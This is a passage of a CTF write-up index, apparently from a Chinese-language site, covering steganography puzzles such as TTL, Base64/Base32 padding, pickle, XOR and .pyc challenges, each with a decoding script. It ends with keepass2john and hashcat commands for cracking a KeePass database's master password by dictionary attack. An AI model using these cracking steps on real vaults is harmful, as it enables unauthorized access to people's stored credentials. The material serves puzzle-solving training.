\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u5b57\u6bcd\n            letters = re.findall(r'[a-z]', text)\n\n            # \u8ba1\u6570\u6bcf\u4e2a\u5b57\u6bcd\u7684\u51fa\u73b0\u6b21\u6570\n            letter_count = Counter(letters)\n\n            return letter_count\n\n    except FileNotFoundError:\n        print(f\"\u6587\u4ef6 {filename} \u672a\u627e\u5230\u3002\")\n\n        return None\n\n\ndef display_top_letters(letter_count, top_n):\n    \"\"\"\u663e\u793a\u51fa\u73b0\u6b21\u6570\u6700\u591a\u7684 top_n \u4e2a\u5b57\u6bcd\u53ca\u5176\u8ba1\u6570\"\"\"\n    if letter_count:\n        top_letters = letter_count.most_common(top_n)\n\n        for letter, count in top_letters:\n            print(f\"'{letter}' \u51fa\u73b0\u4e86 {count} \u6b21\")\n\n\ndef main():\n    # \u6307\u5b9a\u6587\u4ef6\u540d\n    filename = '1.txt'\n\n    letter_count = count_letters(filename)\n\n    if letter_count:\n        # \u4f60\u53ef\u4ee5\u4fee\u6539\u8fd9\u4e2a\u503c\u6765\u663e\u793a\u66f4\u591a\u6216\u66f4\u5c11\u7684\u5b57\u6bcd\n        top_n = 20\n\n        display_top_letters(letter_count, top_n)\n\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"Misc/Chapter1/1-11/","title":"TTL \u9690\u5199","text":""},{"location":"Misc/Chapter1/1-11/#ttl-\u9690\u5199","title":"TTL \u9690\u5199","text":"<p>\u6253\u5f00\u6587\u4ef6\u53ea\u6709 63\u3001255\u3001127\u3001191  \u56db\u79cd\u6570\u503c</p> <p></p> <p>\u8fd9\u56db\u4f4d\u6570\u53ea\u6709\u524d\u4e24\u4f4d\u4e0d\u540c</p> <p></p> <p>\u63d0\u53d6\u51fa\u6765\u5199\u5165\u6587\u4ef6\u4e2d</p> <pre><code>import binascii\n\n\ndef decode_file(input_file, output_file):\n    try:\n        # \u8bfb\u53d6\u6587\u4ef6\u5e76\u5c06\u6bcf\u884c\u8f6c\u6362\u4e3a\u6574\u6570\u5217\u8868\n        with open(input_file, 'r') as fp:\n            p = list(map(int, fp.readlines()))\n\n        # \u6784\u5efa\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\n        binary_string = ''.join(\n            '00' if i == 63 else\n            '01' if i == 127 else\n            '10' if i == 191 else\n            '11' for i in p\n        )\n\n        # \u5c06\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u5206\u6210\u6bcf8\u4f4d\u5e76\u8f6c\u6362\u4e3a\u5b57\u7b26\n        flag = ''.join(chr(int(binary_string[i:i + 8], 2)) for i in range(0, len(binary_string), 8))\n\n        # \u89e3\u7801\u5e76\u5199\u5165\u8f93\u51fa\u6587\u4ef6\n        with open(output_file, 'wb') as wp:\n            wp.write(binascii.unhexlify(flag))\n\n        print(f\"\u6587\u4ef6\u6210\u529f\u89e3\u7801\u5e76\u4fdd\u5b58\u4e3a {output_file}\")\n\n    except FileNotFoundError:\n        print(f\"\u6587\u4ef6 {input_file} \u672a\u627e\u5230\u3002\")\n    except Exception as e:\n        print(f\"\u53d1\u751f\u9519\u8bef: {e}\")\n\n\ndef main():\n    decode_file('attachment.txt', 'ans.zip')\n\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p>\u6253\u5f00\u538b\u7f29\u5305\u6700\u540e\u662f Base64 \u5957\u5a03</p> <p></p>"},{"location":"Misc/Chapter1/1-12/","title":"\u96f6\u5bbd\u5b57\u7b26\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-12/#\u96f6\u5bbd\u5b57\u7b26\u9690\u5199","title":"\u96f6\u5bbd\u5b57\u7b26\u9690\u5199","text":"<p>VS Code \u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u5f88\u591a\u96f6\u5bbd\u5b57\u7b26</p> <p></p> <p>\u89e3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter1/1-13/","title":"\u6587\u4ef6\u5f02\u6216\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-13/#\u6587\u4ef6\u5f02\u6216\u9690\u5199","title":"\u6587\u4ef6\u5f02\u6216\u9690\u5199","text":"<p>\u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u5927\u591a\u6570\u5341\u516d\u8fdb\u5236\u6570\u636e\u662f A1</p> <p>\u63a8\u6d4b\u88ab\u505a\u4e86\u5f02\u6216\u5904\u7406</p> <p></p> <p>\u4e00\u4e2a\u6570\u503c\u8fde\u7eed\u5f02\u6216\u4e24\u6b21\u540c\u4e00\u4e2a\u6570\u503c\u5219\u7ed3\u679c\u4e0d\u53d8</p> <p>\u5f02\u6216\u56de\u53bb\u662f\u4e2a\u97f3\u9891\u6587\u4ef6\uff0c\u6253\u5f00\u542c flag \u5c31\u884c</p> <p></p>"},{"location":"Misc/Chapter1/1-14/","title":"Picke \u5e8f\u5217\u5316\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-14/#picke-\u5e8f\u5217\u5316\u9690\u5199","title":"Picke \u5e8f\u5217\u5316\u9690\u5199","text":"<p>FFD9 \u7ed3\u5c3e\u540e\u7684\u6570\u636e\u5c31\u662f\u8981\u5e8f\u5217\u5316\u7684\u5185\u5bb9</p> <p></p> <p>\u5728 Python \u4e2d\uff0cPickle \u662f\u4e00\u4e2a\u6a21\u5757\uff0c\u7528\u4e8e\u5c06 Python \u5bf9\u8c61\u5e8f\u5217\u5316\uff08\u8f6c\u6362\u4e3a\u5b57\u8282\u6d41\uff09\u548c\u53cd\u5e8f\u5217\u5316\uff08\u4ece\u5b57\u8282\u6d41\u6062\u590d\u4e3a Python \u5bf9\u8c61\uff09</p> <p>\u6211\u8fd9\u91cc\u628a\u4e24\u6bb5\u4ee3\u7801\u5199\u4e00\u8d77\u4e86\uff0c\u53ef\u4ee5\u53bb\u6389\u683c\u5f0f\u5316\u7684\u4ee3\u7801\u67e5\u770b\u6570\u636e\u5185\u5bb9\u4f1a\u53d1\u73b0\u662f\u5750\u6807</p> <pre><code>import pickle\n\n\ndef load_pickle_data(file_path):\n    \"\"\"\u52a0\u8f7d pickle \u6587\u4ef6\u5e76\u8fd4\u56de\u6570\u636e\"\"\"\n    with open(file_path, \"rb\") as fp:\n        return pickle.load(fp)\n\n\ndef write_to_file(file_path, data):\n    \"\"\"\u5c06\u6570\u636e\u5199\u5165\u6587\u4ef6\"\"\"\n    with open(file_path, 'w') as fw:\n        fw.write(str(data))\n\n\ndef process_text(text):\n    \"\"\"\u5904\u7406\u6587\u672c\u5e76\u6839\u636e\u7279\u5b9a\u89c4\u5219\u683c\u5f0f\u5316\u8f93\u51fa\"\"\"\n    i = 0\n    a = 0\n\n    while i &lt; len(text):\n        if text[i] == ']':\n            print('\\n')\n\n            a = 0\n\n        elif text[i] == '(':\n            if text[i + 2] == ',':\n                b = int(text[i + 1]) - a\n\n                d = text[i + 1]\n\n                print(\" \" * b, end=\"\")\n\n                print(text[i + 5], end=\"\")\n\n                a = int(d)\n\n            else:\n                b = int(text[i + 1] + text[i + 2]) - a\n\n                d = text[i + 1] + text[i + 2]\n\n                print(\" \" * b, end=\"\")\n\n                print(text[i + 6], end=\"\")\n\n                a = int(d)\n\n        i += 1\n\n\ndef main():\n    # \u52a0\u8f7d pickle \u6570\u636e\n    a = load_pickle_data(\"123.txt\")\n\n    # \u5c06\u6570\u636e\u5199\u5165\u5230\u6587\u4ef6\n    write_to_file(\"pickle.txt\", a)\n\n    # \u8bfb\u53d6\u6587\u4ef6\u5e76\u5904\u7406\n    with open(\"pickle.txt\", \"r\") as fw:\n        text = fw.read()\n\n    # \u5904\u7406\u6587\u672c\u5185\u5bb9\n    process_text(text)\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter1/1-15/","title":"PYC \u6216 PYO \u9690\u5199","text":""},{"location":"Misc/Chapter1/1-15/#pyc-\u6216-pyo-\u9690\u5199","title":"PYC \u6216 PYO \u9690\u5199","text":"<p>\u62ff\u5230\u6587\u4ef6\u5148\u6539\u4e2a\u540d\u5427\uff0c\u68c0\u6d4b\u662f pyc \u6587\u4ef6</p> <p>\u5728 Python \u4e2d\uff0c<code>.pyc</code> \u6587\u4ef6\u662f Python Compiled File\uff08Python \u7f16\u8bd1\u6587\u4ef6\uff09\u7684\u6269\u5c55\u540d\u3002\u5f53 Python \u811a\u672c\uff08<code>.py</code> \u6587\u4ef6\uff09\u88ab\u6267\u884c\u65f6\uff0cPython \u4f1a\u5c06\u5176\u6e90\u4ee3\u7801\u7f16\u8bd1\u6210\u5b57\u8282\u7801\uff0c\u5e76\u5c06\u5b57\u8282\u7801\u5b58\u50a8\u4e3a <code>.pyc</code> \u6587\u4ef6\u3002\u5b57\u8282\u7801\u662f Python \u4ee3\u7801\u7684\u4f4e\u7ea7\u8868\u793a\uff0c\u5b83\u662f Python \u865a\u62df\u673a\uff08PVM\uff09\u80fd\u591f\u7406\u89e3\u548c\u6267\u884c\u7684\u683c\u5f0f</p> <p></p> <p>\u5728 WinHex \u4e2d\u53d1\u73b0\u9690\u85cf\u6587\u4ef6</p> <p></p> <p>\u4f7f\u7528\u5e38\u89c1\u7684\u5de5\u5177 stegosaurus \u63d0\u53d6\u9690\u5199</p> <p></p>"},{"location":"Misc/Chapter1/1-16/","title":"Word \u6587\u5b57\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-16/#word-\u6587\u5b57\u9690\u5199","title":"Word \u6587\u5b57\u9690\u5199","text":"<p>\u53c2\u8003 Misc 5.23 \u8282\uff0c\u6700\u540e\u662f\u4fee\u6539\u6587\u5b57\u989c\u8272\u5c31\u884c\u4e86</p> <p></p>"},{"location":"Misc/Chapter1/1-17/","title":"Base64 \u9690\u5199","text":""},{"location":"Misc/Chapter1/1-17/#base64-\u9690\u5199","title":"Base64 \u9690\u5199","text":"<p>\u4e0b\u8f7d\u9644\u4ef6\u540e\u4f7f\u7528\u5de5\u5177\u7834\u89e3\u5176\u4f2a\u52a0\u5bc6</p> <p></p> <p>\u9690\u5199\u4fe1\u606f\u85cf\u5728 Base64 \u586b\u5145\u90e8\u5206\uff08<code>=</code>\u7684\u4f4d\u7f6e\uff09\uff1a</p> <ul> <li>\u5f53\u539f\u59cb\u6570\u636e\u957f\u5ea6 \u4e0d\u662f3\u7684\u500d\u6570 \u65f6\uff0cBase64\u7f16\u7801\u672b\u5c3e\u4f1a\u6709<code>=</code>\u586b\u5145\uff081\u62162\u4e2a\uff09</li> <li>\u8fd9\u4e9b<code>=</code>\u7684\u4f4d\u7f6e\u5bf9\u5e94\u7684**\u6700\u540e\u51e0\u4e2a\u6709\u6548 Base64 \u5b57\u7b26**\u53ef\u4ee5\u88ab\u4fee\u6539\u800c\u4e0d\u5f71\u54cd\u89e3\u7801\u7ed3\u679c</li> <li>\u811a\u672c\u901a\u8fc7\u6bd4\u8f83 \u539f\u59cb Base64 \u548c \u91cd\u65b0\u7f16\u7801\u540e\u7684 Base64 \u7684\u5dee\u5f02\u6765\u63d0\u53d6\u9690\u85cf\u4fe1\u606f</li> </ul> <p>\u89e3\u9898\u601d\u8def\uff1a</p> <ol> <li> <p>\u8bfb\u53d6\u6587\u4ef6    \u9010\u884c\u8bfb\u53d6<code>stego.txt</code>\u4e2d\u7684 Base64 \u5b57\u7b26\u4e32\uff08\u6bcf\u884c\u53ef\u80fd\u5305\u542b\u9690\u5199\u6570\u636e\uff09\u3002</p> </li> <li> <p>\u89e3\u7801\u518d\u91cd\u65b0\u7f16\u7801</p> </li> <li> <p>\u5148\u89e3\u7801\u8be5\u884c Base64 \u5f97\u5230\u539f\u59cb\u6570\u636e</p> </li> <li>\u518d\u5c06\u539f\u59cb\u6570\u636e\u91cd\u65b0\u7f16\u7801\u4e3a\u6807\u51c6\u7684 Base64</li> <li> <p>\u6b64\u65f6\uff0c\u91cd\u65b0\u7f16\u7801\u7684\u7ed3\u679c\u4f1a\u548c\u539f\u59cb\u884c\u6709\u7ec6\u5fae\u5dee\u5f02\uff08\u5982\u679c\u5b58\u5728\u9690\u5199\uff09</p> </li> <li> <p>\u8ba1\u7b97\u504f\u79fb\u91cf\uff08\u5173\u952e\u6b65\u9aa4\uff09</p> </li> <li> <p>\u627e\u5230\u539f\u59cb\u884c\u548c\u91cd\u65b0\u7f16\u7801\u540e\u884c\u7684\u6700\u540e\u4e00\u4e2a\u975e<code>=</code>\u5b57\u7b26</p> </li> <li> <p>\u6bd4\u8f83\u8fd9\u4e24\u4e2a\u5b57\u7b26\u5728<code>B64CHARS</code>\u4e2d\u7684\u7d22\u5f15\u5dee\u503c\uff08<code>offset</code>\uff09</p> <pre><code>offset = abs(B64CHARS.index(steg_char) - B64CHARS.index(row_char))\n</code></pre> </li> <li> <p>\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236</p> </li> <li> <p>\u6839\u636e\u8be5\u884c<code>=</code>\u7684\u6570\u91cf\uff08<code>equalnum</code>\uff09\uff0c\u5c06<code>offset</code>\u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff1a</p> <ul> <li>1\u4e2a<code>=</code> \u2192 2\u4f4d\u4e8c\u8fdb\u5236\uff08\u56e0\u4e3a<code>=</code>\u5bf9\u5e94\u6700\u540e 2 \u4e2a\u9690\u85cf\u4f4d\uff09</li> <li>2\u4e2a<code>=</code> \u2192 4\u4f4d\u4e8c\u8fdb\u5236\uff08\u5bf9\u5e94\u6700\u540e 4 \u4e2a\u9690\u85cf\u4f4d\uff09</li> </ul> <pre><code>bin_str += f\"{offset:0{equalnum * 2}b}\"  # \u8865\u96f6\u5230\u6307\u5b9a\u4f4d\u6570\n</code></pre> </li> <li> <p>\u8f93\u51fa\u9690\u85cf\u4fe1\u606f</p> </li> <li> <p>\u6bcf\u5f53<code>bin_str</code>\u7d2f\u79ef\u591f 8 \u4f4d\u65f6\uff0c\u8f6c\u6362\u4e3a ASCII \u5b57\u7b26\u5e76\u8f93\u51fa</p> </li> </ol> <pre><code>import base64\n\nB64CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n\ndef decode_b64_stego(filename):\n    bin_str = ''\n    with open(filename, 'rb') as f:\n        for line in f:\n            stegb64 = line.decode('utf-8').strip()\n            try:\n                decoded = base64.b64decode(stegb64)\n                rowb64 = base64.b64encode(decoded).decode('utf-8').strip()\n\n                steg_char = stegb64.rstrip('=')[-1]\n                row_char = rowb64.rstrip('=')[-1]\n\n                offset = abs(B64CHARS.index(steg_char) - B64CHARS.index(row_char))\n                equalnum = stegb64.count('=')\n\n                if equalnum:\n                    bin_str += f\"{offset:0{equalnum * 2}b}\"\n\n                # \u5b9e\u65f6\u89e3\u7801\u5e76\u8f93\u51fa\uff0c\u6bcf\u6b21\u6362\u884c\n                message = ''\n                for i in range(0, len(bin_str), 8):\n                    if i + 8 &lt;= len(bin_str):\n                        message += chr(int(bin_str[i:i+8], 2))\n                print(message)  # \u6bcf\u6b21\u8f93\u51fa\u540e\u81ea\u52a8\u6362\u884c\n\n            except Exception as e:\n                print(f\"Error processing line: {e}\")\n\nif __name__ == '__main__':\n    decode_b64_stego('stego.txt')\n</code></pre>"},{"location":"Misc/Chapter1/1-18/","title":"\u6587\u4ef6\u4e8c\u8fdb\u5236\u56fe\u50cf\u5316\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-18/#\u6587\u4ef6\u4e8c\u8fdb\u5236\u56fe\u50cf\u5316\u9690\u5199","title":"\u6587\u4ef6\u4e8c\u8fdb\u5236\u56fe\u50cf\u5316\u9690\u5199","text":"<p>\u4e0b\u8f7d\u9644\u4ef6\u653e\u5165 010 \u4e2d\u627e\u5230\u4e00\u4e32 Base64 \u7f16\u7801</p> <p></p> <p>\u89e3\u5bc6\u63d0\u793a 01 \u4e8c\u8fdb\u5236</p> <p></p> <p>\u5c06\u5176\u8f6c\u4e3a\u4e8c\u8fdb\u5236\u5f62\u5f0f</p> <p></p> <p>\u539f\u6765\u662f\u7528 01 \u4e8c\u8fdb\u5236\u753b\u4e86\u4e2a\u56fe</p> <pre><code>CatCTF{CAT_GOES_MEOW}\n</code></pre> <p></p>"},{"location":"Misc/Chapter1/1-19/","title":".rock \u9690\u5199","text":""},{"location":"Misc/Chapter1/1-19/#rock-\u9690\u5199","title":".rock \u9690\u5199","text":"<p>\u4e0b\u8f7d\u9644\u4ef6\u7ed9\u4e86 .rock \u6587\u4ef6</p> <p></p> <p>\u53bb GitHub \u4e0a\u4e0b\u8f7d\u8f6c\u6362\u5de5\u5177\u5c06\u5176\u8f6c\u4e3a Python \u4ee3\u7801</p> <pre><code>pip install rockstar-py\n</code></pre> <p></p> <p>\u8f6c\u6362</p> <pre><code>rockstar-py -i Become_a_Rockstar.rock -o res.py\n</code></pre> <p>\u8fd0\u884c res.py \u591a\u6309\u51e0\u4e0b\u56de\u8f66\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter1/1-2/","title":"\u6587\u4ef6\u5c5e\u6027\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-2/#\u6587\u4ef6\u5c5e\u6027\u9690\u5199","title":"\u6587\u4ef6\u5c5e\u6027\u9690\u5199","text":"<p>\u67e5\u770b\u6587\u4ef6\u5c5e\u6027\u5373\u53ef</p> <p></p>"},{"location":"Misc/Chapter1/1-20/","title":"XORTools \u9690\u5199","text":""},{"location":"Misc/Chapter1/1-20/#xortools-\u9690\u5199","title":"XORTools \u9690\u5199","text":"<p>\u6253\u5f00\u6587\u4ef6\u5168\u662f\u6570\u636e\u4e14\u6587\u4ef6\u5934\u5c3e\u4e0d\u548c\u4efb\u4f55\u7c7b\u578b\u7684\u6587\u4ef6\u5934\u5c3e\u6709\u76f8\u4f3c\u7684\u6587\u4ef6\u90fd\u662f\u6587\u4ef6\u6570\u636e\u88ab\u5f02\u6216\u52a0\u5bc6\u4e86</p> <p>\u4e0b\u8f7d\u5de5\u5177 Xortools \u89e3\u5bc6</p> <pre><code>pip3 install xortool\n</code></pre> <p>\u89e3\u5bc6\u8fd9\u91cc\u6709\u95ee\u9898\uff0c\u5e94\u8be5\u662f <code>GoodLuckToYou</code></p> <p></p> <p>\u4f7f\u7528\u811a\u672c\u89e3\u5bc6</p> <pre><code>key = 'GoodLuckToYou'\nflag = ''\n\nwith open('1') as f:\n    con = f.read()\n    for i in range(len(con)):\n        flag += chr(ord(con[i]) ^ ord(key[i%13]))\n\nf = open('flag.txt', 'w')\nf.write(flag)\nf.close()\n</code></pre> <p></p>"},{"location":"Misc/Chapter1/1-21/","title":"Base32 \u9690\u5199","text":""},{"location":"Misc/Chapter1/1-21/#base32-\u9690\u5199","title":"Base32 \u9690\u5199","text":"<p>\u9898\u76ee\u9644\u4ef6\u7ed9\u4e86\u4e00\u4e2a\u540e\u7f00\u4e3a .pyc \u6587\u4ef6\uff0c010 \u6253\u5f00\u4ed4\u7ec6\u67e5\u770b\u6570\u636e\uff0c\u53d1\u73b0\u6709\u5012\u7f6e\u7684 flag1 \u548c flag2</p> <p></p> <p>\u56e0\u6b64\u6211\u4eec\u5199\u4e2a python \u811a\u672c\u5c06\u6570\u636e\u5012\u7f6e\u56de\u6765</p> <p>\u7136\u540e foremost \u4e00\u4e0b\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u4f2a\u52a0\u5bc6\u7684\u538b\u7f29\u5305</p> <p></p> <p>\u538b\u7f29\u5305\u7684\u6ce8\u91ca\u4e2d\u6709 flag1 \u548c flag2</p> <p></p> <p>\u53bb\u9664\u4f2a\u52a0\u5bc6\u540e\u89e3\u538b\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a Dream It Possible.mp3</p> <p></p> <p>\u8fd9\u91cc\u9700\u8981\u4f7f\u7528 DeEgger Embedder \u63d0\u53d6\u51fa\u9690\u85cf\u7684\u6570\u636e</p> <p></p> <p>\u7528\u4e0a\u9762\u90a3\u4e2a\u5de5\u5177\u53ef\u4ee5\u63d0\u53d6\u51fa\u4e00\u5927\u4e32 base32 \u7f16\u7801\u7684\u5b57\u7b26\u4e32\uff0c\u76f4\u63a5\u89e3\u7801\u53d1\u73b0\u6ca1\u6709\u5f97\u5230\u4ec0\u4e48\u6709\u7528\u7684\u4fe1\u606f</p> <p>\u5c1d\u8bd5 base32 \u9690\u5199\u89e3\u5bc6</p> <pre><code>import base64\n\ndef get_base32_diff_value(stego_line, normal_line):\n    base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\n    for i in range(len(normal_line)):\n        if stego_line[i] != normal_line[i]:\n            return abs(base32chars.index(chr(stego_line[i]))-base32chars.index(chr(normal_line[i])))\n    return 0\n\n# base32 \u9690\u5199\u89e3\u5bc6\ndef base32stego_decode(lines):\n    res = ''\n    for i in lines:\n        stego_line = i.strip()\n        normal_line = base64.b32encode(base64.b32decode(i.strip()))\n        diff = get_base32_diff_value(stego_line, normal_line)\n        if '=' not in str(stego_line):\n            continue\n        if diff:\n            res += bin(diff)[2:]\n        else:\n            res += '0'\n    return res\n\nwith open(\"Dream It Possible - extracted.txt\", 'rb') as f:\n    file_lines = f.readlines()\nen=open(\"encrypt.txt\",\"w\")\nen.write(base32stego_decode(file_lines))\nen.close()\n</code></pre> <p>\u63d0\u53d6 base32 \u9690\u5199\u7684\u6570\u636e\u53ef\u4ee5\u5f97\u5230\u4e00\u5927\u4e32\u4e8c\u8fdb\u5236\u7684\u5b57\u7b26\uff0c\u8fd9\u91cc\u8fd8\u4e0d\u77e5\u9053\u5177\u4f53\u5e72\u5565\u7528\uff0c\u8f6c\u56fe\u7247\u4e5f\u6ca1\u6709\u53d1\u73b0\u6709\u7528\u7684\u4fe1\u606f</p> <p>\u56e0\u6b64\u6211\u4eec\u56de\u5934\u5206\u6790\u90a3\u4e2a pyc \u6587\u4ef6\uff0c\u76f4\u63a5\u4f7f\u7528 uncompyle6 \u5c31\u53ef\u4ee5\u53cd\u7f16\u8bd1\u51fa\u539f\u6765\u7684 Python \u6e90\u7801</p> <pre><code># uncompyle6 version 3.9.1\n# Python bytecode version base 2.7 (62211)\n# Decompiled from: Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)]\n# Embedded file name: Fl4g.py\n# Compiled at: 2017-07-02 00:15:33\nfrom os import urandom\n\ndef generate(m, k):\n    result = 0\n    for i in bin(m ^ k)[2:]:\n        result = result &lt;&lt; 1\n        if int(i):\n            result = result ^ m ^ k\n        if result &gt;&gt; 256:\n            result = result ^ P\n\n    return result\n\n\ndef encrypt(seed):\n    key = int(urandom(32).encode('hex'), 16)\n    while True:\n        yield key\n        key = generate(key, seed) + 233333333333L\n\n\ndef convert(string):\n    return int(string.encode('hex'), 16)\n\n\nP = 115792089237316195423570985008687907853269984665640564039457584007913129640997L\nflag1 = 'ThIs_Fl4g_Is_Ri9ht'\nflag2 = 'Hey_Fl4g_Is_Not_HeRe'\nkey = int(urandom(32).encode('hex'), 16)\ndata = open('data.txt', 'r').read()\nresult = encrypt(key)\nencrypt1 = bin(int(data, 2) ^ eval('0x' + hex(result.next())[2:-1] * 22))[2:]\nencrypt2 = hex(convert(flag1) ^ result.next())[2:-1]\nencrypt3 = hex(convert(flag2) ^ result.next())[2:-1]\nprint 'flag1:', encrypt2\nprint 'flag2:', encrypt3\nf = open('encrypt.txt', 'w')\nf.write(encrypt1)\nf.close()\n\n# okay decompiling .\\reverse_1_PyHaHa.pyc\n</code></pre> <p>\u7531\u4e0a\u8ff0\u4ee3\u7801\u53ef\u77e5\u6211\u4eec\u4e4b\u524d\u5f97\u5230\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u5e94\u8be5\u5c31\u662f\u4e0a\u8ff0\u4ee3\u7801\u4e2d\u7684 encrypt.txt</p> <p>\u56e0\u6b64\u6211\u4eec\u5199\u4e00\u4e2a Python \u811a\u672c\u53bb\u8fd8\u539f\u51fa\u539f\u6765\u7684\u6570\u636e\uff0c\u5177\u4f53\u811a\u672c\u5982\u4e0b\uff1a</p> <pre><code>from PIL import Image\nimport libnum\nimport os\n\n\ndef generate(m, k):\n    result = 0\n    for i in bin(m ^ k)[2:]:\n        result = result &lt;&lt; 1\n        if int(i):\n            result = result ^ m ^ k\n        if result &gt;&gt; 256:\n            result = result ^ P\n\n    return result\n\n\ndef draw2pic(data):\n    if os.path.exists(\"pic_output\"):\n        print(\"[!] pic_output \u76ee\u5f55\u5df2\u5b58\u5728\")\n    else:\n        print(\"[+] pic_output \u76ee\u5f55\u521b\u5efa\u6210\u529f\")\n        os.mkdir(\"pic_output\")\n    length = len(data)\n    dic = {X: int(length / X)\n           for X in range(1, length) if length % X == 0}\n    for item in dic.items():\n        pos = 0\n        img = Image.new(\"RGB\", (item[0], item[1]))\n        for x in range(item[0]):\n            for y in range(item[1]):\n                if data[pos] == '0':\n                    img.putpixel([x, y], (0, 0, 0))\n                else:\n                    img.putpixel([x, y], (255, 255, 255))\n                pos += 1\n        img.save(f\"./pic_output/{item[0]}_{item[1]}.png\")\n        print(\n            f\"./pic_output/{item[0]}_{item[1]}.png Saved!\")\n\n\nif __name__ == \"__main__\":\n    P = 115792089237316195423570985008687907853269984665640564039457584007913129640997\n    flag1 = 'ThIs_Fl4g_Is_Ri9ht'\n    flag2 = 'Hey_Fl4g_Is_Not_HeRe'\n    encrypt2 = 0xec8d57d820ad8c586e4be0122b442c871a3d71cd8036c45083d860caf1793ddc\n    encrypt3 = 0xc40a0be335babcfbd8c47aa771f6a2ceca2c8638caa5924da58286d2a942697e\n    encrypt1 = open('encrypt.txt', 'r').read()\n    key2 = encrypt2 ^ libnum.s2n(flag1)\n    key3 = encrypt3 ^ libnum.s2n(flag2)\n    print(key2)\n    print(key3)\n    tmp = key3 - 233333333333\n    for i in range(0, 255):\n        tmp = generate(tmp, 0)\n    seed = tmp ^ key2\n    print('Found seed:', seed)\n    print('use seed generate key3:', generate(key2, seed)+233333333333)\n    tmp = key2 - 233333333333\n    for i in range(0, 255):\n        tmp = generate(tmp, 0)\n    key1 = tmp ^ seed\n    print('Found key1:', key1)\n    print('use key1 generate key2:', generate(key1, seed)+233333333333)\n    tmp1 = hex(int(encrypt1, 2))\n    tmp2 = '0x'+hex(key1)[2:]*22\n    pic_data = bin(int(tmp1, 16) ^ int(tmp2, 16))[2:]\n    draw2pic(pic_data)\n</code></pre> <p></p>"},{"location":"Misc/Chapter1/1-22/","title":".lnk \u9690\u5199","text":""},{"location":"Misc/Chapter1/1-22/#lnk-\u9690\u5199","title":".lnk \u9690\u5199","text":"<p>\u653e\u5165 010 \u4e2d\u663e\u793a <code>.lnk</code> \u540e\u7f00</p> <p></p> <p><code>cmd</code> \u8fd0\u884c\u76f4\u63a5\u62a5\u9519</p> <p></p> <p>\u4f46\u662f\u751f\u6210\u4e86\u4e00\u4e2a flag \u6587\u4ef6</p> <p></p> <p>\u6309\u8def\u5f84\u6253\u5f00\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter1/1-23/","title":"\u9690\u85cf\u6587\u4ef6\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-23/#\u9690\u85cf\u6587\u4ef6\u9690\u5199","title":"\u9690\u85cf\u6587\u4ef6\u9690\u5199","text":"<p>\u65b0\u624b\u9898\uff0c\u5728 Windows \u4e2d\u52fe\u9009\u67e5\u770b\u9690\u85cf\u6587\u4ef6\u5373\u53ef</p> <p></p> <p>\u8fdb\u5165 <code>.ThePassword</code> \u76ee\u5f55\u62ff\u5230\u5bc6\u7801</p> <p></p> <p>\u6253\u5f00 PDF \u8f93\u5165\u5bc6\u7801</p> <p></p> <p>\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter1/1-24/","title":".kdbx \u9690\u5199\uff08Key\uff09","text":""},{"location":"Misc/Chapter1/1-24/#kdbx-\u9690\u5199key","title":".kdbx \u9690\u5199\uff08Key\uff09","text":"<p>\u4e0b\u8f7d\u6587\u4ef6\u540e\u5148\u628a\u540e\u7f00\u540d <code>.zip</code> \u8865\u4e0a\uff0c\u518d\u89e3\u538b\u7f29</p> <p></p> <p><code>.kdbx</code> \u6587\u4ef6\u9700\u8981 keepass \u6253\u5f00\uff0c\u6253\u5f00\u53d1\u73b0\u9700\u8981\u5bc6\u7801</p> <p></p> <p><code>keepass2john</code> \u662f John The Ripper\uff08\u7b80\u79f0 JtR\uff09\u81ea\u5e26\u7684\u8f85\u52a9\u5de5\u5177</p> <p>\u7528\u4e8e\u628a KeePass \u5bc6\u7801\u5e93\uff08<code>.kdbx</code> \u6587\u4ef6\uff09\u8f6c\u6362\u4e3a John the Ripper \u53ef\u8bc6\u522b\u7684\u54c8\u5e0c\u683c\u5f0f</p> <p>\u4ece\u800c\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\uff08\u5982\u5b57\u5178\u653b\u51fb\u3001\u89c4\u5219\u653b\u51fb\u7b49\uff09\u53bb\u7834\u89e3\u4e3b\u5bc6\u7801</p> <pre><code>keepass2john '/home/kali/len5.kdbx'\n</code></pre> <p></p> <p>\u5220\u6389\u5f00\u5934\u7684 <code>len5:</code></p> <p></p> <p>\u4f7f\u7528\u5de5\u5177 HashCat \u7206\u7834</p> <pre><code>hashcat -m 13400 keepass.hash  -a 0 password.txt  --force\n# m\uff1a\u7834\u89e3\u7684 hash\u7c7b\u578b\uff0chashcat -h \u4f55\u67e5\u770b\u7c7b\u578b\n# a\uff1a\u7206\u7834\u7684\u65b9\u6cd5\uff0c0 \u8868\u793a\u5b57\u5178\u7206\u7834\n# force\uff1a\u4e0d\u62a5\u9519\n</code></pre> <p>\u5f97\u5230\u5bc6\u7801 